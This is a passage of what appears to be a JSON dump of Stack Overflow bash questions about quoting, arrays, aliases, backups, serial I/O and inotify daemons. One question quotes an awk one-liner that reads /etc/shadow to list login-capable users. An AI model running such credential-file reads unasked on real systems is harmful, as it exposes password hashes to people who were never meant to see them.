prints:</p>\n\n<pre><code>a* b*\n</code></pre>\n\n<p>The latter prints:</p>\n\n<pre><code>a.txt\nb.txt\n</code></pre>\n\n<p>I want:</p>\n\n<pre><code>a*\nb*\n</code></pre>\n\n<p>How can I make this work?</p>\n"},{"tags":["bash","vim","cygwin","alias"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13262139,"title":"How can I alias 'gvim filename' to 'gvim filename &'","body":"<p>I want gvim to always open in a separate window and return the command prompt immediately.  In other words I want</p>\n\n<pre><code>gvim filename\n</code></pre>\n\n<p>to be the same as</p>\n\n<pre><code>gvim filename &amp;\n</code></pre>\n\n<p>it seems like I should be able to do this with an alias.  Is there a special wildcard character for aliases?  Something like:</p>\n\n<pre><code>alias gvim=\"gvim &lt;wildcard&gt; &amp;\"\n</code></pre>\n\n<p>Where \"wildcard\" would be replaced by whatever text comes after gvim on the command line.</p>\n\n<p>I also tried:</p>\n\n<pre><code>function gvim() \n{ \n    \"/cygdrive/c/program files (x86)/vim/vim72/gvim.exe\" \"$@\" \"&amp;\" ;\n}\n</code></pre>\n\n<p>But it only opens gvim and doesn't return the prompt like I want it to.</p>\n\n<p>If someone could point me in the right direction, it would greatly improve my understanding of how .bashrc works.</p>\n\n<p>Thanks!</p>\n\n<p>-Derek</p>\n\n<p>UPDATE: I got it to work by getting rid of the quotation marks around the &amp; and the semicolon at the end:</p>\n\n<pre><code>function gvim() \n{ \n    \"/cygdrive/c/program files (x86)/vim/vim72/gvim.exe\" \"$@\" &amp;\n}\n</code></pre>\n"},{"tags":["arrays","bash","email","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13272184,"title":"How to send array values by mail","body":"<p>in linux scripting,</p>\n\n<p>is there a way to use mail function to one time send array values??</p>\n\n<pre><code>function my_mail_function(){\n\n# send array values\nmail array_values_here \"mymail@domain.tld\" ;\n}\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["android","linux","image","bash","imagemagick"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13273909,"title":"Change the quality of the image (without changing the resolution)","body":"<p>I found this command</p>\n\n<p>Resize an image with improved quality:</p>\n\n<pre><code>$ convert input.png -colorspace RGB +sigmoidal-contrast 11.6933 \\ \n-define filter:filter=Sinc -define filter:window=Jinc -define filter:lobes=3 \\ \n-resize 400% -sigmoidal-contrast 11.6933 -colorspace sRGB output.png\n</code></pre>\n\n<p>But I need something else, I need a command to decrease the image quality.\nFor example if the input.png is 100pix x 100pix resolution and 100KB size\nI want to make an output.png image with the same resolution but lower quality, let say 50KB</p>\n\n<p>how can I do this ?</p>\n\n<p>(My original problem is the limitation to 50KB images, and all I want to do is convert all my images below 50KB size).</p>\n\n<p>I hope this is easy to solve but could not figured out on my own.</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","filenames","spaces","cp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":233,"score":0,"question_id":6848783,"title":"How do I use a variable containing a filename with spaces in a bash script?","body":"<p>I have a simple bash script running on OS X that removes specific files and directories and copies new ones in their place.  One Mac .app directory contains a space, and when I run the script there is a \"No such file or directory\" error.</p>\n\n<p>Here is the relevant code.  A good amount has been cut out, so simply hard coding these differently isn't possible (the variables must be broken up as they are):</p>\n\n<pre><code>CP=\"cp -Rf\"\n\nINSTALL_DIR=\"/Applications/\"\n\nAPP=\"The App.app\"\n\nNEWAPP=\"$HOME/Downloads/The App.app\"\n\n$CP \"$NEWAPP \" \"$INSTALL_DIR$NEWAPP\"\n</code></pre>\n\n<p>I've tried escaping <code>The\\ App.app</code> with no luck, as well as trying single quoting, double quoting, and double escaping, but nothing has worked.  I imagine there is a simple way to do this.</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13275220,"title":"execute a directory in linux","body":"<p>I would like to execute a directory like this: './some_directory some_args'. In that some_directory there can be a script that grabs these some_args, processes them and passes them to a binary executable or other script located in the same directory. Basically, I want to run a script in some_director without specifying its name. There is got to be a default script to run I guess when doing './some_directory some_args' in bash or other shell. Thanks.</p>\n"},{"tags":["bash","shell","prolog","swi-prolog","gnu-screen"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13263264,"title":"Screen escapes differently when called from bash","body":"<p>I have a long running server process called ROBUST, which has a console. We run it in a screen and attach to manually manipulate the server (it's a virtual world server).</p>\n\n<p>I have a web app (in prolog) that occasionally needs to add a user. ROBUST has a couple programmatic interfaces that are both awkward for various reasons. So I'm trying to just\nshell out, attach a screen with -X, and do the equivilent of typing</p>\n\n<p>create user SomeUser SomeName SomePass somebody@somewhere.com\nnewline</p>\n\n<p>on the console.  This line </p>\n\n<p><code>screen -S ROBUST -p 0 -X eval 'stuff \"create user SomeUser SomeName SomePass somebody@somewhere.com ^M\"</code>'</p>\n\n<p>works </p>\n\n<p>but when I put it in this bash script</p>\n\n<pre><code>#!/bin/bash\nscreen -S ROBUST -p 0 -X eval 'stuff \"create user $1 $2 $3 $4 ^M\"'\n</code></pre>\n\n<p>it doesn't.\nAttaching to the ROBUST console with another terminal and watching, it thinks the line ends at create user</p>\n\n<p>I've tried every scheme I can think of for escaping the various single and double quotes, but at this point am stumped.</p>\n\n<p>later comment:</p>\n\n<p>I got around the need for bash script by figuring out the prolog process_create syntax</p>\n\n<pre><code>?- process_create(path(screen), ['-S', 'ROBUST', '-p', '0', '-X', eval, 'stuff \"create user Manny Muncher somepass somebody@uh.edu^M\"'], []).\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13275983,"title":"Bad substitution error in bash script","body":"<p>I have tried a lot but couldn't get the solution out of it. I have a simple script:</p>\n\n<pre><code>#! /bin/sh\no=\"12345\"\na=o\nb=${!a}\necho ${a}\necho ${b}\n</code></pre>\n\n<p>When executed like</p>\n\n<pre><code>$ . scp.sh\n</code></pre>\n\n<p>it produces the correct output with no errors but when executed like:</p>\n\n<pre><code>$ ./scp.sh\n</code></pre>\n\n<p>it produces \n    ./scp.sh: 4: ./scp.sh: Bad substitution</p>\n\n<p>Any ideas why this is happening. </p>\n\n<p>@bobah suggested to use bash mode and it works fine. But when I execute this same script through python (changing the script header to bash), I am getting the same error.</p>\n\n<p>Question edited again:</p>\n\n<pre><code>import os\nos.system(\". ./scp.sh\")\n</code></pre>\n\n<p>Regards</p>\n\n<p>Shahzad</p>\n"},{"tags":["perl","bash","perl-module"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13275288,"title":"How do you prevent perl from making a dump file?","body":"<p>Currently I am running several scripts which are in a experimental testing stage. Unfortunately they crash on occasion and generate large \"core-perl-11-544-546-27320-1xxxxxxx\" perl core dump files.</p>\n\n<p>I want to ensure that if in the future these files crash again, they do not generate perl dump files, or the files size of the dump is limited. </p>\n\n<p>Right now there are some scripts checking for Perl core dump files and removing them if they are greater than a set size, but this is an obvious band-aid on a broken knee. </p>\n\n<p><strong>How might I go about limiting the size of the perl dump file, or preventing one from being made?</strong></p>\n"},{"tags":["linux","bash","shell","variables","mysqldump"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":37,"score":-1,"question_id":13270050,"title":"Variable stops file extension being included in filename","body":"<p>I have this working script to save a daily backup named (for example) <code>db-Nov-07-2012.sql.gz</code>:</p>\n\n<pre><code>#!/bin/bash\nNOW=$(date +\"%b-%d-%y\")\nmysqldump -h server -u user -ppassword dbname | gzip &gt; /path/to/folder/db-backups/db-$NOW.sql.gz\n</code></pre>\n\n<p>But when I modify the script to save a quarterly backup named (for example) <code>db-Nov-07-2012-09-35.sql.gz</code>:</p>\n\n<pre><code>#!/bin/bash\nNOW=$(date +\"%b-%d-%y-%H-%M\")\nmysqldump -h server -u user -ppassword dbname | gzip &gt; /path/to/folder/db-quarter-backups/db-$NOW.sql.gz\n</code></pre>\n\n<p>it did previously work, and I have since reuploaded (accidentally deleted) it and now no longer includes the file extension in the filename; I get just <code>db-Nov-07-2012-09-35</code>, without the <code>.sql.gz</code>.</p>\n\n<p>The file is created on Windows and ran on linux.</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["linux","bash","logging","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13274818,"title":"Bash - Log ssh script timstamp of execution to file in server","body":"<p>I have a script that executes some commands remotely, everytime it runs it appends the time of execution to a log, thought I was doing it right but then realized the script was sending the time/date of my machine and not using the server time/date in the log.</p>\n\n<p>This is the command I'm using right now:</p>\n\n<pre><code>ssh root@myserver \"echo \\\"*** Log info of $(date -u) ***\\\" &gt;&gt; /var/log/app.log\"\n</code></pre>\n\n<p>I tried using single quotes but it does not work at all the script shows an error.</p>\n\n<p>Is there a better way to log that time to a server file?</p>\n\n<p>Thanks in advance for any advice</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13272728,"title":"Bash script get item from array","body":"<p>I'm trying to read file line by line in bash.</p>\n\n<p>Every line has format as follows <code>text|number</code>.</p>\n\n<p>I want to produce file with format as follows <code>text,text,text</code> etc. so new file would have just text from previous file separated by comma. </p>\n\n<p>Here is what I've tried and couldn't get it to work :</p>\n\n<pre><code>FILENAME=$1\n\nOLD_IFS=$IFSddd\nIFS=$'\\n'\ni=0\nfor line in $(cat \"$FILENAME\"); do\n    array=(`echo $line | sed -e 's/|/,/g'`)\n    echo ${array[0]}\n    i=i+1;\ndone\nIFS=$OLD_IFS\n</code></pre>\n\n<p>But this prints both text and number but in different format <code>text number</code></p>\n\n<p>here is sample input :</p>\n\n<pre><code>dsadadq-2321dsad-dasdas|4212\ndsadadq-2321dsad-d22as|4322\n</code></pre>\n\n<p>here is sample output:</p>\n\n<pre><code>dsadadq-2321dsad-dasdas,dsadadq-2321dsad-d22as\n</code></pre>\n\n<p>What did I do wrong?</p>\n"},{"tags":["git","bash","hook"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":45,"score":3,"question_id":13179232,"title":"Git post-receive hook not firing external script","body":"<p>Here's what I've done so far:</p>\n\n<ol>\n<li>I have a server that hosts websites and their git repositories.</li>\n<li>I have a user named <code>git</code> that owns all the repos and has the ability to log in as any user without entering a password.</li>\n<li>I created a hook called <code>post-receive</code> in the <code>hooks</code> directory on my repo.</li>\n<li>I also created a script called <code>gitpull</code> that pulls the info to the sites automatically.</li>\n</ol>\n\n<p>Everything is O.K. when I type this command:</p>\n\n<pre><code>su - git -c \"/git/sitename.git/hooks/post-receive\"\n</code></pre>\n\n<p>but when I push something from my development machine, it does not run the script <code>gitpull</code>.</p>\n\n<p>Here are my files:</p>\n\n<ul>\n<li><p><code>/etc/gitpull</code>:</p>\n\n<pre><code>#!/bin/bash\nsu - $1 -c \"cd ~/www;git pull;\"\n</code></pre></li>\n<li><p><code>/git/sitename/hooks/post-receive</code>:</p>\n\n<pre><code>#!/bin/bash\n/etc/gitpull sitename\n</code></pre></li>\n</ul>\n\n<p>How can I fix this? What am I doing wrong?</p>\n"},{"tags":["bash","shell","case","wildcard"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13273621,"title":"Shell is variable a number","body":"<p>Good evening,\nI want to write a script that will say if its argument is a number or not, however I get this:</p>\n\n<pre><code>a: 4: Syntax error: \"(\" unexpected (expecting \")\")\n</code></pre>\n\n<p>At first I tried like this:</p>\n\n<pre>\n    #!/bin/bash\n    case \"$1\" in\n        0x* ) echo hex ;;\n        ''|*[!0-9]*) echo dec ;;\n        * ) echo wtf ;;\n    esac\n</pre>\n\n<p>Later I have found this bit:</p>\n\n<pre>\n    if ! [[ \"$yournumber\" =~ ^[0-9]+$ ]] ; then\n       exec >&2; echo \"error: Not a number\"; exit 1\n    fi\n</pre>\n\n<p>Well, none of them works, I call for help!</p>\n"},{"tags":["bash","install"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13272399,"title":"Bash command for automatically confirm option during installation","body":"<p>Whenever you're installing a package, it usually prompts for y/n confirmation, is there a way to automate this?</p>\n"},{"tags":["python","bash","serial-port"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":12016029,"title":"Moving Terminal Program from Bash to Python on Linux","body":"<p>I am dealing with an Industrial Environment where I must record readings from a serial device out in the field. My current setup involves the device connected to a Moxa 5150A or 5130 Serial Device Server which connects to my network thru wired or wireless means depending on the location of the individual device. At current I am reliant upon software from my hardware vendor to manage the data collection. The current software is windows X86 based and has cause no end of trouble on newer hardware we have purchased due to the failure of previous hardware. I selected the Moxa serial servers specifically for their linux drivers and compatibility. The device communicates over RS-422 (4-wire Half Duplex) 7-bit 1-stop odd-parity and NO-flow control and does not send any information unless requested.</p>\n\n<p>I am working to develop my own solution that will store the information in a database (probably MySQL). In terms of terminal communication this is two part. I must send a request and receive the response.</p>\n\n<p>To date I have installed the Moxa drivers for the serial servers onto my linux server. I have written a bash script that reads from the /dev/ttyrXX device, interprets the input and loads the information into a mysql database.</p>\n\n<pre><code>      while read line\n      do\n      something something....\n      done &lt; /dev/ttyrXX\n</code></pre>\n\n<p>I am still working out minor scripting bugs such as restarting properly when a device goes offline and later comes back online and other such issues, but my script is reading and logging my data well within my needs.</p>\n\n<p>This solution relies on two factors. </p>\n\n<p>1) the Moxa Devices support FIFO and allow multiple connections simultaneously</p>\n\n<p>2) the vendor provided software running on a separate windows machine is currently submitting requests for information.</p>\n\n<p>I need to remove the windows based software all together. I have written and tested a script that prints to /dev/ttyrXX making my desired requests and received the appropriate responses and had them logged as desired by my first script.</p>\n\n<pre><code>     some list of things\n     for x in list\n     do         \n     printf \"request\" &gt; /dev/ttyrXX\n     done\n</code></pre>\n\n<p>One of the major issues I have experienced with the vendor supplied software is its hard coded dependence on receiving a timely response to every single request. This creates a number of issues including completely freezing up windows and crashing should the device fall out of service at an inopportune time.</p>\n\n<p>My two scripts working in unison collect the data at a significantly better interval and with alot less human intervention.</p>\n\n<p>Here is my question. What method can I use in Python to obtain comparable results to my Bash script? </p>\n\n<p>I have been unable to locate a Python equivalent to printf or cat that does not require me to open/close a file. Furthermore every terminal interface I've looked at has the built-in or required wait for response or read for so long before giving up. I'm certain that something exists out there I have simply had little to no luck finding it. I'll admit that I am brand spanking new to Python and have not written more than a few lines of code to poke around at its abilities.</p>\n\n<p>Let me be very clear. I want to write to my terminal without concern for anything else when I'm writing (using a thread or separate script I don't care). I want to read from my terminal without a care in the world for when my next bit of text is coming. (I'm not suggesting a never ending loop, but I do need it to simply stand by and wait for input). I WANT/NEED my write to and read from to be completely independent of one another with no concern for what the other is doing yesterday, right now, or next week.</p>\n\n<p>Thank You in advance.</p>\n\n<p>I will be able to provide more detailed code if that is necessary, However I feel that I am in more need of direction in my searching than for bug fixing. Though I am still completely open to advice and \"Don't EVER DO THIS.... BECAUSE OF THIS...\" type input</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":13260974,"title":"How to check if process is running in linux","body":"<p>I am trying to automatically check if a process is running or not and have to perform next steps accordingly. I had written a bash script but it doesn't seem to work.</p>\n\n<pre><code>if ps aux | grep [M]yProcessName &gt; /dev/null\nthen\n  echo \"Running\"\nelse\n  echo \"Not running\"\nfi\n</code></pre>\n\n<p>Is my <code>if</code> statement wrongly used?</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":404,"score":2,"question_id":10582763,"title":"How to return an array in bash without using globals?","body":"<p>Suppose you've written some function which gathers some values in an array.</p>\n\n<pre><code>my_algorithm() {\n  create_array # call create_array somehow\n  # here, work with the array \"returned\" from my_list\n}\n\ncreate_array() {\n  local my_list=(\"a\", \"b\", \"c\")\n}\n</code></pre>\n\n<p>How can I \"return\" my_list without using anything global?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I could do something like</p>\n\n<pre><code>my_algorithm() {\n  local result=$(create_array)\n}\n\ncreate_array() {\n  local my_list=(\"a\", \"b\", \"c\")\n  echo \"${my_list[@]}\"\n}\n</code></pre>\n\n<p>But then, I only get an expanded string (or is this the way to go?).</p>\n"},{"tags":["mysql","bash","heredoc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13268018,"title":"How to pass an asterisk into bash heredoc?","body":"<p>I execute a MySQL statement with an asterisk from within a bash shell:</p>\n\n<pre><code>query=`cat &lt;&lt;EndOfMySQL\nINSERT tmp_table\nSELECT * FROM table\n;\nEndOfMySQL\n`\n\necho $query\n\necho $query | mysql database\n</code></pre>\n\n<p>The problem is the asterisk is replaced by the list of files in the current directory and the query becomes erroneous. How to avoid this behavior? It doesn't matter whether I use backticks or <code>$()</code>. I'd expect some escape sequence like <code>\\*</code>, but at least this one doesn't work.</p>\n"},{"tags":["linux","bash","awk"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13258902,"title":"Simple aggregation using linux scripting","body":"<p>Let's say I have a text file with lines like these:</p>\n\n<pre><code>foo 10\nbar 15\nbar 5\nfoo 30\n...\n</code></pre>\n\n<p>What's the simplest way to generate the following output:</p>\n\n<pre><code>foo 40\nbar 20\n</code></pre>\n\n<p>?</p>\n"},{"tags":["python","linux","bash"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13267948,"title":"Linux server list users who can login","body":"<p>I would like either a one liner shell command or a short bash/python script that will list all the users on a Linux server that can login to that machine. so users like www-data and mail would be excluded of course but root would be part of the list.</p>\n\n<p>This code for example works. I <a href=\"https://gist.github.com/1989361\" rel=\"nofollow\">found it here</a>. But I'm looking for something simpler cleaner.</p>\n\n<pre><code>awk -F: '$2 != \"*\" &amp;&amp; $2 !~ /^!/ { print $1, \" can log in\" }' /etc/shadow\n</code></pre>\n"},{"tags":["bash","daemon","inotify","inotify-tools"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13267359,"title":"How to daemonize an inotifywait bash script on ubuntu?","body":"<p>I'm currently fighting to track changes on my filesystem.</p>\n\n<p>My problem is that I need to watch a bit over 150 folders recursively and take some action based on the file that has been added. Therefore I already tried serveral options like incron(not recursive working - next please) and finally came up with inotifywait which does a perfect job so far - but has to run in my active shell and does not run in the background which forces me to keep the shell open and this is some kind of not possible.</p>\n\n<p>So what I want to do is, to make a daemon with that inotifywait command.</p>\n\n<p>My Script looks like this:</p>\n\n<pre><code>#!/bin/sh\n\ninotifywait -rm --format '%w %f' -e close_write /var/www/catalog | while read dir file; do\n/root/bin/filechanged.sh ${dir}${file}\ndone\n</code></pre>\n\n<p>As I came down to the man page of inotifywait I recognized that there is a -d option for daemon:</p>\n\n<blockquote>\n  <p>-d, --daemon Same as --monitor, except run in the background logging events to a file that must be specified by --outfile. Implies\n  --syslog.</p>\n</blockquote>\n\n<p>But that didn't work as expected as my while loop still needs to read the output to tell me what file has changed.</p>\n\n<p>After some search on google I came up with a startup script like the one underneath, that nearly worked but missed some stuff to make it work as a service. Unfortunately the one who fixed the script didn't post his solution but only said it works now after a small fix.</p>\n\n<pre><code>    start() {\n    if [ ! -x \"$inotifywait\" ]; then\n        exit 5\n    fi\n    echo -n $\"Starting $prog: \"\n    daemon $inotifywait -rm --format '%w %f' -e close_write /var/www/catalog | while read dir file; do\n        /root/bin/filechanged.sh ${dir}${file}\n    done &gt;/dev/null 2&gt;&amp;1 &amp;\n    RETVAL=$?\n    if [ $RETVAL -eq 0 ]; then\n        touch $lockfile\n    fi\n    echo\n\n    return $RETVAL\n}\n</code></pre>\n\n<p>So, I just need to make this job a background job so that I'm no longer forced to have this one shell open all the time. I thought about the -d option and tracking down the log file, but that seemed to be the hard way.</p>\n\n<p>I'm really thankful for any help! </p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13265697,"title":"bash redirection with a result of another command","body":"<p>This command works very well.</p>\n\n<pre><code>bash &lt; &lt;(echo 'ls')\n</code></pre>\n\n<p>How this code work?<br>\nI cannot understand internal process of this script.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":27,"score":1,"question_id":13255642,"title":"Preserve color when outputing with tee","body":"<p>I'm trying to get the output of a program (which has colors) and output it with <code>tee</code>. I want the output to have colors on the terminal (stdout) but not on the output file. Is this possible?</p>\n"},{"tags":["linux","bash","mount"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13262519,"title":"granting access to files on a USB drive from separate computers","body":"<p>All,</p>\n\n<p>I have two computers: home and work.  I have set these up pretty similarly (although home is Linux Mint 13 and work is Ubuntu 11.10).  Assume my account name at work is \"me_work\" and my account name at home is \"me_home\". </p>\n\n<p>I use a USB drive to share files from one computer to the other.  I have written a script which mounts different directories of that drive to different directories on each system.  For example, I do something like:</p>\n\n<pre><code>mount --bind /media/USB/MyProject $HOME/Projects/MyProject\n</code></pre>\n\n<p>As I work, on either computer, I do stuff in $HOME/Projects and this all gets saved on the USB drive.  If I swap the USB drive out from one computer to the other, the files are all still there.  </p>\n\n<p>But there's a problem.</p>\n\n<p>If I create a file while on my work computer it will be owned by the user \"me_work\" and the associated group \"me_work\".  If I try to play with that file on my home computer I fail b/c I don't have permission to modify them.  Furthermore, the \"me_work\" user or group are not known on my home computer.  </p>\n\n<p>Now, I could just <code>sudo</code> into everything, but I'm not always using a terminal - sometimes I'm doing stuff on a webserver, sometimes I'm using an IDE, etc.  </p>\n\n<p>How can I set things up so that the contents of the USB drive are readable by both my accounts?  I have tried adding a new group to both computers called \"me_usb\" and setting both accounts to be members of that group.  Then setting the gid of the directories on the USB to \"me_usb\" and making them group-writable.  Unfortunately, that had no effect.</p>\n"},{"tags":["bash","shell","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13264529,"title":"How to find if there are new files in a directory every 2 minutes in shell script?","body":"<p>I have a directory called <code>/home/user/local</code>. Every two minutes or so, a new file is dumped into this directory. I need to check this directory every 2 minutes to see if a new file/files have landed in there. And if there are new files, I need to put a list of it into a variable to use later on. How do I do this shell script? </p>\n"},{"tags":["bash","parameters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13264375,"title":"Checking the data in the file and only accepting the required number of parameters to calculte the area using bash script","body":"<p>Part 1) My script allows the command line options -r, -c, and -t for rectangle, circle and trapezoid respectively.  The rectangle option requires two arguments, the length and the width.  The circle option requires one argument, the radius.  The trapezoid option requires three arguments, the height and each of the parallel bases. \nPart 2) The script allows the option, -f.  When this option is used in conjunction with -r, -c, or –t, each option takes one argument, the name of the input file.  The input values would be read from the input file one line at a time and the areas printed to stdout. The script should terminate when a value of –1 is read.</p>\n\n<p>I have part 1 and part 2 both done except the script terminating when -1 is read. What I want to do on the second part is for the rectangle when i give it an input file is to check whether that file has 2 values in each line or not. If it does not have 2 values then echo \"file has invalid set(s) of data\". Same with circle, it should not accept anything that has more or less value than 1 in each line of th input file and for trapezoid 3. </p>\n\n<pre><code>        filename=$OPTARG;;\n        while read -a line\n        do\n            if (( $choice == 1 ))\n                    then\n                            Area=`echo \"scale=3; ${line[0]}*${line[1]}\" | bc`;\n                            echo \"Area of the rectangle is $Area\";\n\n            fi\n            if (( $choice == 2 ))\n                    then\n                            Pi=3.1416\n                            Area=`echo \"scale=3; ${line[0]*$line[0]}*$Pi\" | bc`;\n                            echo \"Area of the circle is $Area\";\n\n            fi\n            if (( $choice == 3 ))\n                then\n                            Area=`echo \"scale=3; (${line[0]}+${line[1]})/2*${line[2]}\" | bc`;\n                            echo \"Area of the trapezoid is $Area\";\n\n            fi\n            done &lt; \"$filename\"\n</code></pre>\n"},{"tags":["bash","find","sh"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13263894,"title":"Unix `find` on Win MSYS, no such file or directory","body":"<p>I'm trying run a <code>git pull</code> on a bunch of folders. This is what I got so far:</p>\n\n<pre><code>find . -type d -name .git \\\n| xargs -n 1 dirname \\\n| while read line; do cd $line &amp;&amp; git pull; done\n</code></pre>\n\n<p>Problem is that <code>cd</code> doesn't work I get a bunch of errors:</p>\n\n<pre><code>sh: cd: ./project_one: No such file or directory\nsh: cd: ./project_two: No such file or directory\n...\n</code></pre>\n\n<p>But when I do <code>cd ./project_one</code> it works fine. What's wrong? Any ideas?</p>\n"},{"tags":["bash","shell","script","snmp"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13252583,"title":"shell script : array related issue","body":"<p>using linux 2.6.18..  </p>\n\n<pre><code>/bin/bash -version\nGNU bash, version 1.14.7(1)\n</code></pre>\n\n<p>(snmpwalk command gives output in a console like...below)</p>\n\n<pre><code>33\n4232\n5342\n632\n45342\n23342\n3243\n</code></pre>\n\n<p>I am using shell script to grep data from snmp and trying to add it in array. but cannot do this with following problems...</p>\n\n<pre><code>#!/bin/bash\nOID=\"1.3.6.1.2.1.2.2.1\"\n\ndeclare -a index=$(snmpwalk -v 2c -c public -Oqv localhost ${OID}.1) \ndeclare -a upload=$(snmpwalk -v 2c -c public -Oqv localhost ${OID}.10) \ndeclare -a download=$(snmpwalk -v 2c -c public -Oqv localhost ${OID}.11)\n\necho \"retrieved ${#index[@]} elements\"\necho \"#${index[3]}: up=${upload[2]} down=${download[2]}\"\n</code></pre>\n\n<p>output:</p>\n\n<pre><code> + declare -a index=1 2\n    j2.sh: 4: j2.sh: declare: not found\n</code></pre>\n\n<p>(so I can not use 'declare')</p>\n\n<p>2nd way </p>\n\n<pre><code>#!/bin/bash\n\n    OUTPUT1=$(snmpbulkwalk -Oqv -c public -v 2c localhost\n    1.3.6.1.4.1.21067.4.1.1.1 2&gt; /dev/null)\n    i=1\n    index=1\n    upload=1\n    download=1\n    for LINE in ${OUTPUT1}\n        do\n            index=$LINE\n\n        OUTPUT2=$(snmpget -Oqv -c public -v 2c localhost 1.3.6.1.4.1.21067.4.1.1.10.$i 2&gt; /dev/null)\n        OUTPUT3=$(snmpget -Oqv -c public -v 2c localhost 1.3.6.1.4.1.21067.4.1.1.11.$i 2&gt; /dev/null)\n            upload=$OUTPUT2\n            download=$OUTPUT3\n            i=`expr $i + 1`\n        done\n</code></pre>\n\n<p>its gives bettelnack with large amount of data...</p>\n\n<p>3ra approch :</p>\n\n<pre><code>#!/bin/bash\nOUTPUT=$(snmpbulkwalk -Oqv -c public -v 2c localhost\n1.3.6.1.4.1.21067.4.1.1.1 2&gt; /dev/null)\ni=0\nindex[3000]=0\nfor LINE in ${OUTPUT} ; do\n    index[$i]=$LINE\n    i=`expr $i + 1`\n\ndone\n</code></pre>\n\n<p>here index[1],index[2]...... are not fount</p>\n"},{"tags":["bash","echo"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":107,"score":4,"question_id":13258664,"title":"echo \"-n\" will not print -n?","body":"<p>Very similar <a href=\"http://stackoverflow.com/questions/320313/echo-e-doesnt-print-anything\">to this question</a>.</p>\n\n<p>I'm iterating through a few things with an automated script in BASH. Occasionally the script will come across \"-n\" and echo will attempt to interpret this.</p>\n\n<p>Attempted this:</p>\n\n<pre><code> $ POSIXLY_CORRECT=1 /bin/echo -n\n</code></pre>\n\n<p>and</p>\n\n<pre><code> $ POSIXLY_CORRECT=1 /bin/echo \"-n\"\n</code></pre>\n\n<p>But it interpreted the argument each time.</p>\n\n<p>Then this, which works but it's possible to hit escaped characters in the strings, which is why I don't want to apply a null character to all input and use -e.</p>\n\n<pre><code>$ echo -e \"\\x00-n\"\n-n\n</code></pre>\n\n<p>printf is possible, but is to be avoided unless there are no other options (Not all machines have printf as a utility).</p>\n\n<pre><code>$printf \"%s\" \"-n\"\n-n\n</code></pre>\n\n<p>So is there a way to get echo to print \"-n\"?</p>\n"},{"tags":["bash","shell","cp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13258123,"title":"Shell Scripting unwanted '?' character at the end of file name","body":"<p>I get an unwanted '?' at the end of my file name while doing this: </p>\n\n<pre><code>emplid=$(grep -a \"Student ID\" \"$i\".txt  | sed 's/(Student ID:  //g' | sed 's/)Tj//g' ) \n #gets emplid by doing a grep from some text file\necho \"$emplid\"   #prints employee id correctly \ncp \"$i\" \"$emplid\".pdf  #getting an extra '?' character after emplid and before .pdf\n</code></pre>\n\n<p>i.e instead of getting the file name like 123456.pdf , I get 123456?.pdf . \nWhy is this happening if the echo prints correctly? \nHow can I remove trailing question mark characters ?</p>\n"},{"tags":["bash","shell","sed","awk","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13260386,"title":"Shell script/commands for text manipulation","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13259293/shell-script-for-formatting-output\">Shell 